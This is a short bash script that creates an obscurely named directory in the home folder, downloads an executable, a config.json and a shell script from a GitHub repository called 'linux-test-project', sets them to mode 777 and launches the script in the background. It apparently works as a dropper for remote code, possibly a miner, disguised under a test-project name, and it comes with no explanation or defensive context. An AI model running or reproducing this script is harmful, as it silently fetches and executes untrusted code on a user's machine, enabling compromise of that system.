#!/bin/bash

# Directory to check
DIR=~/gpUxgdSz

if [ -d "$DIR" ]; then
  echo "Running"
else
  cd ~
  mkdir gpUxgdSz
  cd gpUxgdSz
  curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/javarunprocess
  chmod 777 javarunprocess
  curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/config.json
  
  curl -O https://raw.githubusercontent.com/KarleyGreenholt/linux-test-project/refs/heads/main/five.sh
  chmod 777 five.sh
  ./five.sh &
fi
